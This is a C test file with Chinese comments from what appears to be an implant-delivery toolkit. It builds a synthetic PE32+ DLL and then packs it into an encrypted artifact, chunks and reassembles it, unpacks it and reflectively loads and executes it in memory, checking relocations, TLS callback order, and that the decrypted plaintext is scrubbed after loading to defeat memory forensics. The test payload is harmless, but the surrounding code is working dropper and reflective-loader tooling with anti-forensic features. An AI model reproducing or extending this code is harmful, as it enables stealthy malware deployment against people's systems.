/*
 * 25_deploy/tests/test_drop_pe.c
 *
 * 端到端：合成 PE32+ -> 打包成制品 -> 分块 -> 组装 -> 解包 -> 反射装载 -> 真执行。
 *
 * 与 test_reflect_run 的区别（不重复那一项）：
 *   test_reflect_run  验证"给定一个明文 PE，反射装载器能不能跑起来"
 *   本测试            验证"投送侧解出来的密文制品，能不能一路走到执行"
 *                     —— 中间多了打包/分块/组装/解包四步，任何一步错位
 *                        都会表现为"装载失败"，而根因在别处。
 *
 * 载荷不是只返回退出码：入口点会把重定位后的指针值、TLS/入口执行次序
 * 写进 .data。只验"没崩"不够 —— 装载器若没跳，进程也可能正常退出。
 */

#include "drop_pe.h"
#include "packer.h"

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>

static int g_fail;
static int g_pass;

#define CHECK(cond, msg) do { \
    if (cond) { printf("[PASS] %s\n", msg); g_pass++; } \
    else      { printf("[FAIL] %s\n", msg); g_fail++; } \
} while (0)

/* ---------------- 合成 PE32+ ---------------- */

#define IMAGE_BASE   0x140000000ULL   /* MSVC 默认；>4GiB，可暴露 32 位截断 */
#define TEXT_RVA     0x1000u
#define DATA_RVA     0x2000u
#define SLOT_RVA     0x1100u          /* DIR64 重定位槽（.text） */
#define RELOC_RVA    0x1200u
#define TLSDIR_RVA   0x1250u
#define TLSCB_RVA    0x1300u          /* 回调指针数组 */
#define STUB_TLS     0x1400u          /* TLS 回调代码 */
#define STUB_ENTRY   0x1500u          /* 入口点代码 */
#define MARK_RVA     0x2600u          /* .data: "MARK" */
#define REC_RVA      0x2700u          /* .data: 记录区 */

#define FILE_ALIGN   0x200u
#define FILE_SIZE    0x3200u

static void wr16(uint8_t *p, uint16_t v) { p[0]=(uint8_t)v; p[1]=(uint8_t)(v>>8); }
static void wr32(uint8_t *p, uint32_t v) { for (int i=0;i<4;i++) p[i]=(uint8_t)(v>>(8*i)); }
static void wr64(uint8_t *p, uint64_t v) { for (int i=0;i<8;i++) p[i]=(uint8_t)(v>>(8*i)); }

/* RVA -> 文件偏移 */
static size_t r2o(uint32_t rva)
{
    if (rva >= DATA_RVA) return 0x2200u + (rva - DATA_RVA);
    return 0x200u + (rva - TEXT_RVA);
}

static void emit_stub(uint8_t *b, uint32_t rva, int is_tls)
{
    uint8_t *p = b + r2o(rva);
    uint8_t *q = p;
    if (is_tls) {
        *q++ = 0xC6; *q++ = 0x81; wr32(q, REC_RVA);      q += 4; *q++ = 0x01;
        *q++ = 0xFE; *q++ = 0x81; wr32(q, REC_RVA + 0x11); q += 4;
    } else {
        /* 入口：先取出当前值（证明 TLS 已跑过），写 2，再搬重定位指针 */
        *q++ = 0x8A; *q++ = 0x81; wr32(q, REC_RVA);        q += 4;
        *q++ = 0x88; *q++ = 0x81; wr32(q, REC_RVA + 0x01); q += 4;
        *q++ = 0xC6; *q++ = 0x81; wr32(q, REC_RVA);        q += 4; *q++ = 0x02;
        *q++ = 0x48; *q++ = 0x8B; *q++ = 0x81; wr32(q, SLOT_RVA); q += 4;
        *q++ = 0x48; *q++ = 0x89; *q++ = 0x81; wr32(q, REC_RVA + 0x08); q += 4;
        *q++ = 0xFE; *q++ = 0x81; wr32(q, REC_RVA + 0x10); q += 4;
    }
    *q++ = 0xC3;   /* ret */
}

static void build_pe(uint8_t *b)
{
    memset(b, 0, FILE_SIZE);

    /* DOS 头 */
    b[0] = 'M'; b[1] = 'Z';
    wr32(b + 0x3C, 0x40);
    memcpy(b + 0x40, "PE\0\0", 4);

    /* COFF 头 @0x44 */
    wr16(b + 0x44, 0x8664);        /* AMD64 */
    wr16(b + 0x46, 2);             /* 2 个节区 */
    /* COFF 头字段偏移：Machine+0, NumSec+2, TimeDateStamp+4, PtrSymTab+8,
       NumSyms+12, SizeOfOptionalHeader+16, Characteristics+18（相对 0x44）。
       首版把后两个写到了 +12/+14，Characteristics 因此读到 0 -> 装载器按
       EXE 处理，入口 a1=0，桩里拿 rcx 当基址即写地址 0 崩溃。 */
    wr16(b + 0x54, 240);           /* SizeOfOptionalHeader */
    /* IMAGE_FILE_DLL(0x2000) | EXECUTABLE_IMAGE(0x0002) | LARGE_ADDRESS_AWARE(0x0020)
       必须是 DLL：EXE 入口不接参数（实测 a1=0），而反射装载的植入体一律是
       DLL，入口按 (hInstance, reason, reserved) 调用，rcx 才是映像基址。 */
    wr16(b + 0x56, 0x2022);

    /* Optional PE32+ @0x58 */
    uint8_t *oh = b + 0x58;
    wr16(oh + 0,  0x20b);
    wr32(oh + 16, STUB_ENTRY);     /* AddressOfEntryPoint */
    wr32(oh + 20, TEXT_RVA);       /* BaseOfCode */
    wr64(oh + 24, IMAGE_BASE);
    wr32(oh + 32, 0x1000);         /* SectionAlignment */
    wr32(oh + 36, FILE_ALIGN);
    wr32(oh + 56, 0x3000);         /* SizeOfImage */
    wr32(oh + 60, 0x200);          /* SizeOfHeaders */
    wr16(oh + 68, 3);              /* Subsystem: CUI */
    wr64(oh + 72, 0x100000); wr64(oh + 80, 0x1000);
    wr64(oh + 88, 0x100000); wr64(oh + 96, 0x1000);
    wr32(oh + 108, 16);            /* NumberOfRvaAndSizes */
    wr32(oh + 152, RELOC_RVA); wr32(oh + 156, 12);   /* dir5 BaseReloc */
    wr32(oh + 184, TLSDIR_RVA); wr32(oh + 188, 40);  /* dir9 TLS */

    /* 节区头 @0x148 */
    uint8_t *sh = b + 0x148;
    memcpy(sh, ".text\0\0\0", 8);
    /* VirtualSize 必须是 0x1000：写成 0x2000 会与 .data 的 0x2000..0x3000
       重叠，映像构造阶段两个节区往同一段内存写，装载后代码落点错位。 */
    wr32(sh + 8,  0x1000); wr32(sh + 12, TEXT_RVA);
    wr32(sh + 16, 0x1000); wr32(sh + 20, 0x200);
    wr32(sh + 36, 0x60000020);     /* CODE|EXECUTE|READ */
    memcpy(sh + 40, ".data\0\0\0", 8);
    wr32(sh + 48, 0x1000); wr32(sh + 52, DATA_RVA);
    wr32(sh + 56, 0x1000); wr32(sh + 60, 0x2200);
    wr32(sh + 76, 0xC0000040);     /* INITIALIZED_DATA|READ|WRITE */

    /* 内容 */
    emit_stub(b, STUB_TLS,   1);
    emit_stub(b, STUB_ENTRY, 0);
    wr64(b + r2o(SLOT_RVA), IMAGE_BASE + MARK_RVA);
    memcpy(b + r2o(MARK_RVA), "MARK", 4);

    /* 重定位块：1 个 DIR64 + 1 个 ABSOLUTE 填充 = BlockSize 12 */
    wr32(b + r2o(RELOC_RVA),     TEXT_RVA);
    wr32(b + r2o(RELOC_RVA) + 4, 12);
    wr16(b + r2o(RELOC_RVA) + 8, (uint16_t)((10u << 12) | (SLOT_RVA - TEXT_RVA)));
    wr16(b + r2o(RELOC_RVA) + 10, 0);

    /* TLS 目录：AddressOfCallBacks 在 +24 */
    wr64(b + r2o(TLSDIR_RVA) + 24, IMAGE_BASE + TLSCB_RVA);
    wr64(b + r2o(TLSCB_RVA),       IMAGE_BASE + STUB_TLS);
    wr64(b + r2o(TLSCB_RVA) + 8,   0);
}

/* ---------------- 回调 ---------------- */

static uint8_t *g_region;
static int      g_prot_calls;

static int t_protect(void *ud, uint8_t *addr, size_t len, int prot)
{
    (void)ud;
    g_prot_calls++;
    int p = 0;
    if (prot & RR_P_R) p |= PROT_READ;
    if (prot & RR_P_W) p |= PROT_WRITE;
    if (prot & RR_P_X) p |= PROT_EXEC;
    if (!p) p = PROT_NONE;
    return mprotect(addr, len, p);
}

static int t_call(void *ud, uint64_t va, uint64_t a1, uint64_t a2, uint64_t a3,
                  uint64_t *ret)
{
    (void)ud;
    uint64_t r = 0;
    __asm__ __volatile__(
        "sub $0x28, %%rsp\n\t"
        "mov %[a1], %%rcx\n\t"
        "mov %[a2], %%rdx\n\t"
        "mov %[a3], %%r8\n\t"
        "call *%[fn]\n\t"
        "add $0x28, %%rsp\n\t"
        "mov %%rax, %[out]\n\t"
        : [out] "=r"(r)
        : [fn] "r"(va), [a1] "r"(a1), [a2] "r"(a2), [a3] "r"(a3)
        : "rax", "rcx", "rdx", "r8", "r9", "r10", "r11", "memory", "cc");
    if (ret) *ret = r;
    return 0;
}

static int t_resolve(const char *dll, const char *func, uint16_t hint,
                     int by_ordinal, void *ud, uint64_t *out)
{
    (void)dll; (void)func; (void)hint; (void)by_ordinal; (void)ud; (void)out;
    return -1;    /* 本合成 PE 无导入；被调用即说明装载器越界解析 */
}

static uint8_t rb(uint8_t *region, uint32_t rva) { return region[rva]; }

static uint64_t rq(uint8_t *region, uint32_t rva)
{
    uint64_t v; memcpy(&v, region + rva, 8); return v;
}

/* ---------------- 用例 ---------------- */

static const uint8_t SEED[32] = {
    0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09,0x0a,0x0b,0x0c,0x0d,0x0e,0x0f,0x10,
    0x11,0x12,0x13,0x14,0x15,0x16,0x17,0x18,0x19,0x1a,0x1b,0x1c,0x1d,0x1e,0x1f,0x20
};

/* 打包 + 分块 + 组装，产出已 seal 的 dp_asm_t */
static int make_artifact(const uint8_t *raw, size_t raw_len, dp_asm_t *a)
{
    size_t   blen = pk_size_bound_v4(raw_len);
    uint8_t *blob = malloc(blen);
    if (!blob) return -1;

    /* bind_id / eph_pub 必须给零填充数组，不可传 NULL：制品头会读它们 */
    uint8_t bind_id[PK_BIND_ID_LEN];
    uint8_t eph_pub[PK_EPH_PUB_LEN];
    memset(bind_id, 0, sizeof(bind_id));
    memset(eph_pub, 0, sizeof(eph_pub));

    int rc = pk_pack_shaped(raw, raw_len, SEED, sizeof(SEED),
                            bind_id, 1u, eph_pub, blob, &blen);
    if (rc != 0) { free(blob); return -1; }

    dp_manifest_t m;
    rc = dp_manifest_build(blob, blen, 16u * 1024u, &m);
    if (rc != 0) { free(blob); return -1; }

    dp_asm_init(a, &m);
    for (uint32_t i = 0; i < m.nchunks; i++) {
        size_t off = (size_t)i * m.chunk_size;
        size_t clen = (blen - off < m.chunk_size) ? (blen - off) : m.chunk_size;
        if (dp_asm_put(a, i, blob + off, clen) != 0) {
            dp_asm_free(a); free(blob); return -1;
        }
    }
    free(blob);
    return dp_asm_seal(a);
}

static void t_full_chain(void)
{
    uint8_t *pe = malloc(FILE_SIZE);
    build_pe(pe);

    dp_asm_t a;
    if (make_artifact(pe, FILE_SIZE, &a) != 0) {
        printf("[FAIL] 制品构造失败\n"); g_fail++; free(pe); return;
    }
    printf("[INFO] 制品块数=%u 已收齐=%u\n", a.nchunks, a.got_count);

    /* 解包 */
    size_t   cap = FILE_SIZE;
    uint8_t *out = malloc(cap);
    dp_pe_info_t info;
    int rc = dp_asm_unpack_pe(&a, SEED, sizeof(SEED), out, &cap, &info);
    CHECK(rc == DP_OK, "封装制品解包成功");
    CHECK(cap == FILE_SIZE, "解包长度与原始 PE 一致");
    CHECK(memcmp(out, pe, FILE_SIZE) == 0, "解包逐字节无损");
    CHECK(info.region_need >= 0x3000u, "region 需求 = SizeOfImage(0x3000)");
    printf("[INFO] region_need=%zu is_dll=%d machine=0x%x\n",
           info.region_need, info.is_dll, info.machine);

    /* 分配 region（先 RW，最终权限由 protect 回调逐节设定） */
    size_t   rsz  = (info.region_need + 0xFFF) & ~(size_t)0xFFF;
    uint8_t *region = mmap(NULL, rsz, PROT_READ | PROT_WRITE,
                           MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (region == MAP_FAILED) { printf("[FAIL] mmap\n"); g_fail++; return; }
    g_region = region;

    rr_hooks_t h;
    memset(&h, 0, sizeof(h));
    h.ud = NULL; h.protect = t_protect; h.call = t_call;
    h.resolve = t_resolve; h.res_ud = NULL;

    dp_pe_result_t r;
    rc = dp_pe_run(out, cap, region, rsz, &h, &r);
    CHECK(rc == DP_OK, "反射装载并执行成功");
    CHECK(r.entry_invoked == 1, "入口点确已被调用");
    CHECK(r.n_tls == 1, "TLS 回调执行了 1 次");
    CHECK(r.n_reloc >= 1, "基址重定位生效");
    printf("[INFO] n_reloc=%u n_import=%u n_sections=%u\n",
           r.n_reloc, r.n_import, r.n_sections);

    /* 顺序：TLS 先于入口。TLS 写 1，入口把它搬到 +1 再写 2 */
    CHECK(rb(region, REC_RVA) == 2, "记录字节最终为 2（入口写）");
    CHECK(rb(region, REC_RVA + 1) == 1, "记录字节 +1 为 1（证明 TLS 先执行）");
    CHECK(rb(region, REC_RVA + 0x10) == 1, "入口计数 = 1");
    CHECK(rb(region, REC_RVA + 0x11) == 1, "TLS 计数 = 1");

    /* 重定位：槽位值应为 region+MARK_RVA，且能解引用出 MARK */
    uint64_t ptr = rq(region, REC_RVA + 8);
    CHECK(ptr == (uint64_t)(uintptr_t)(region + MARK_RVA),
          "重定位在真实执行路径上生效（读到 region+MARK_RVA）");
    CHECK(ptr != 0 && memcmp((const void *)(uintptr_t)ptr, "MARK", 4) == 0,
          "经重定位的指针可解引用到真实数据 'MARK'");

    /* 明文擦除 */
    dp_pe_scrub(out, cap);
    int nonzero = 0;
    for (size_t i = 0; i < cap; i++) if (out[i]) { nonzero++; break; }
    CHECK(nonzero == 0, "装载后明文已擦除（内存取证面消除）");

    munmap(region, rsz);
    dp_asm_free(&a);
    free(out);
    free(pe);
}

static void t_negative(void)
{
    uint8_t *pe = malloc(FILE_SIZE);
    build_pe(pe);

    dp_asm_t a;
    if (make_artifact(pe, FILE_SIZE, &a) != 0) { free(pe); g_fail++; return; }

    /* 1. 未 seal */
    dp_asm_t b; dp_manifest_t m;
    dp_manifest_build((const uint8_t *)"aaaaaaaaaaaaaaaa", 16, 16, &m);
    dp_asm_init(&b, &m);
    /* 缓冲必须按最大用例（FILE_SIZE）分配：后续把 cap 报成 FILE_SIZE 却只
       分配 4096 会让解包越界写，破坏堆，表现为末尾 free(): invalid pointer，
       而所有断言照样通过 —— 这类"通过但已损坏"最易被误判为产品问题。 */
    size_t cap = FILE_SIZE; uint8_t *out = malloc(cap);
    if (!out) { free(pe); dp_asm_free(&a); g_fail++; return; }
    CHECK(dp_asm_unpack_pe(&b, SEED, sizeof(SEED), out, &cap, NULL)
          == DP_ERR_INCOMPLETE, "未 seal 拒绝解包");
    dp_asm_free(&b);

    /* 2. 篡改一字节 */
    a.buf[a.len / 2] ^= 0x40;
    cap = FILE_SIZE;
    CHECK(dp_asm_unpack_pe(&a, SEED, sizeof(SEED), out, &cap, NULL)
          == DP_ERR_DIGEST, "制品被篡改后解包失败（不泄露原因）");

    /* 3. 非 PE 明文 */
    dp_asm_free(&a);
    const char *txt = "this is definitely not a PE image, just plain text payload";
    if (make_artifact((const uint8_t *)txt, strlen(txt), &a) == 0) {
        cap = 1024;
        CHECK(dp_asm_unpack_pe(&a, SEED, sizeof(SEED), out, &cap, NULL)
              == DP_ERR_PE, "解包成功但内容非 PE -> DP_ERR_PE");
        dp_asm_free(&a);
    }

    /* 4. 重新构造一个干净制品，测 region 不足与回调缺失 */
    if (make_artifact(pe, FILE_SIZE, &a) != 0) { free(out); free(pe); g_fail++; return; }
    cap = FILE_SIZE;
    dp_pe_info_t info;
    CHECK(dp_asm_unpack_pe(&a, SEED, sizeof(SEED), out, &cap, &info) == DP_OK,
          "（对照）干净制品解包 OK");

    size_t rsz = (info.region_need + 0xFFF) & ~(size_t)0xFFF;
    uint8_t *region = mmap(NULL, rsz, PROT_READ | PROT_WRITE,
                           MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    g_region = region;

    rr_hooks_t h;
    memset(&h, 0, sizeof(h));
    h.protect = t_protect; h.call = t_call; h.resolve = t_resolve;

    CHECK(dp_pe_run(out, cap, region, 0x1000, &h, NULL) == DP_ERR_REGION,
          "region 小于 SizeOfImage -> DP_ERR_REGION");

    rr_hooks_t h2; memset(&h2, 0, sizeof(h2));
    h2.protect = t_protect; h2.call = t_call;      /* resolve 缺失 */
    CHECK(dp_pe_run(out, cap, region, rsz, &h2, NULL) == DP_ERR_NOHOOK,
          "回调缺失 -> DP_ERR_NOHOOK（绝不降级给 RWX 执行）");

    CHECK(dp_pe_run(NULL, 0, region, rsz, &h, NULL) == DP_ERR_ARG,
          "空载荷 -> DP_ERR_ARG");

    munmap(region, rsz);
    dp_asm_free(&a);
    free(out);
    free(pe);
}

int main(void)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("=== test_drop_pe: 投送制品 -> 解包 -> 反射装载 -> 真执行 ===\n");
    t_full_chain();
    t_negative();
    printf("=== result: %d pass, %d fail ===\n", g_pass, g_fail);
    return g_fail ? 1 : 0;
}
